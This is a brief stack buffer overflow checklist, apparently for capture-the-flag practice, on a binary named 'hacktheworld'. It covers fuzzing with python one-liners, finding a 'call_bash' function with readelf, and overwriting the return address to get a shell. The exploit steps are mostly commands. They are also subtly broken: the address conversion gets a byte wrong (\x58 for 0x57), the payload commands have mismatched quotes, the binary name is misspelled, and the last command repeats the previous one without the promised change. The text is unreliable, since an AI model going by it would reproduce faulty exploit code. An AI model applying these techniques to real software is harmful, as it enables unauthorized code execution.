# Basic Reverse Engineering Checklist

## Download the Binary

Download whatever binary you're working with to your local machine using SCP, HTTP or, if you have source code, download the source code and build it locally using gcc.

## Dissassembler

Next, you can use IDA64 / Ghidra (if it's embedded) to dissassemble the software you're dealing with into a readable assembly / C format. The next part isn't instructable, you've got to search for vulnerable functions that you  can exploit, such as gets().

## Smashing the stack 

You can easily use python:

	python3 -c 'print("A"*50)' | ./hacktheworld

To fuzz data into the binary until you're able to cause a segmentation fault.

## Calling Functions

You can use “readelf” and “grep” to find the memory address of the function you want to call:

	readelf -s hacktheworld | grep -i "call_bash"

Take that memory address and convert it to hex, while retaining the endianness that you started with:

	For example, if the memory address was 0000000000400657
	The correct hex string would be \x58\x06\x40\x00\x00\x00\x00\x00


	python -c 'print "A"*72 + \x58\x06\x40\x00\x00\x00\x00\x00"' | ./hacketheworld

Sometimes your shell will execute, but will not stay- because it's not been given an argument. Adding a commabd to your argument can help this

python -c 'print "A"*72 + \x58\x06\x40\x00\x00\x00\x00\x00"' | ./hacketheworld
